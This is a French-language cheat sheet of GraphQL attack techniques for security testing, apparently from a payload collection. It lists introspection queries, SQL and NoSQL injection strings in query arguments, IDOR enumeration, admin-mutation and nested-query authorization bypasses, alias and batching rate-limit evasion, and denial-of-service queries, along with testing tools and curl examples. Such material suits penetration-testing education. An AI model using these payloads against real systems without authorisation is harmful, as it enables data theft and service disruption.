# 📊 Fiche pratique des injections GraphQL

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](GraphQL-Injection.tr.md) • [🇬🇷 Ελληνικά](GraphQL-Injection.el.md)

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> **Précisions de lecture :** Un fragment cyclique doit être refusé par une validation conforme à la [spécification GraphQL](https://spec.graphql.org/September2025/#sec-Fragment-Spreads-Must-Not-Form-Cycles). Son exemple ne garantit donc pas un DoS sur un serveur conforme. L’introspection ou une suggestion de champ ne prouvent pas, seules, une faille d’autorisation. Les injections dépendent du traitement des résolveurs et des données côté serveur. Le lien de retour vise le README de Payloads, absent du dépôt source fourni ; aucun fichier de remplacement n’a été inventé.

---

## 🔍 Notions de base GraphQL

### Points de terminaison courants
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

### Structure des requêtes
```graphql
# Requête
{
  user(id: 1) {
    name
    email
  }
}

# Avec un nom d’opération
query GetUser {
  user(id: 1) {
    name
  }
}

# Mutation
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

## 🎯 Requêtes d’introspection

### Introspection du schéma complet
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Type Query (points d’entrée)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Type Mutation
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Tous les types
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

### Détails d’un type précis
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

## 💉 Attaques par injection

### Injection SQL via GraphQL
```graphql
# Dans les arguments
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# Fondé sur UNION
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

### Injection NoSQL
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# Ou au format JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

### IDOR (référence directe non sécurisée à un objet)
```graphql
# Accès aux données d’autres utilisateurs
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Énumérer tous les utilisateurs
{
  users {
    id
    name
    email
    role
  }
}
```

---

## 🔥 Contournement de l’autorisation

### Absence d’autorisation sur les mutations
```graphql
# Essayer les opérations d’administration avec un utilisateur ordinaire
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

### Contournement par requêtes imbriquées
```graphql
# Accéder aux données sensibles par les relations entre objets
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

### Abus des suggestions de champs
```graphql
# Si les suggestions sont activées, essayer des champs invalides
{
  user(id: 1) {
    passwor  # Peut suggérer "password"
  }
}
```

---

## 🚀 Divulgation d’informations

### Informations de débogage
```graphql
# Énumération par les erreurs
{
  __typename
}

# Requête invalide pour obtenir une trace de pile
{
  invalid_field_that_doesnt_exist
}
```

### Découverte de champs sensibles
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

## 🛡️ Techniques de contournement

### Contournement par alias
```graphql
# Contournement de la limitation du débit par alias
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

### Attaques par regroupement de requêtes
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### Modification de la casse
```graphql
# Essayer différentes casses
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

### Injection de fragments
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

## 💣 Attaques par déni de service (DoS)

### Attaque par requête profondément imbriquée
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Fragment circulaire
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Référence circulaire
}
```

### Ensemble de résultats volumineux
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

## 🛠️ Outils de test

### GraphQL Voyager
```bash
# Visualiser le schéma
https://graphql-kit.com/graphql-voyager/
# Coller le résultat de l’introspection
```

### InQL (extension Burp)
```
# Fonctionnalités :
- Schema extraction
- Query generation
- Vulnerability scanning
```

### graphql-cop
```bash
# Outil d’audit de sécurité
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### graphw00f
```bash
# Identification de l’implémentation GraphQL
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

### Client GraphQL Altair
```
# Client de bureau pour les tests
https://altairgraphql.dev/
```

---

## 📝 Exemples cURL

### Requête de base
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

### Avec des variables
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

### Introspection
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### Avec authentification
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

## 📋 Liste de contrôle des tests

```markdown
## GraphQL Security Checklist

□ Identifier les points de terminaison GraphQL
□ Vérifier l’introspection (extraction du schéma)
□ Extraire toutes les requêtes et mutations
□ Tester les IDOR dans les requêtes d’objets
□ Tester l’autorisation des mutations
□ Rechercher les injections SQL/NoSQL dans les arguments
□ Tester les requêtes imbriquées pour détecter des fuites
□ Vérifier la limitation du débit (contournement par alias)
□ Tester les requêtes regroupées
□ Rechercher les champs sensibles (password, token)
□ Tester la limitation de profondeur (DoS)
□ Rechercher les informations divulguées par les erreurs
□ Tester les points de terminaison des abonnements
```

---

## 🔗 Récapitulatif des vulnérabilités courantes

|Vulnérabilité|Test|Conséquences|
|---------------|------|--------|
|**Introspection activée**|Interroger `__schema`|Divulgation du schéma|
|**IDOR**|Modifier les identifiants dans les requêtes|Accès aux données d’autres utilisateurs|
|**Absence d’authentification**|Requête sans jeton|Accès non autorisé|
|**SQLi/NoSQLi**|Injecter dans les arguments|Compromission du SGBD|
|**Données excessives**|Interroger les champs sensibles|Fuite de données|
|**DoS**|Requêtes profondes ou circulaires|Indisponibilité du service|
|**Abus du regroupement**|Plusieurs requêtes|Contournement de la limitation du débit|

---

## 🔗 Charges utiles connexes

- [Charges utiles SQLi](./SQLi.fr.md)
- [Injection NoSQL](./NoSQL-Injection.fr.md)
- [Sécurité des API](../../API-Security/translations/README.fr.md)

---

**Retour aux charges utiles :** [💉 Collection de charges utiles](../../README.md)
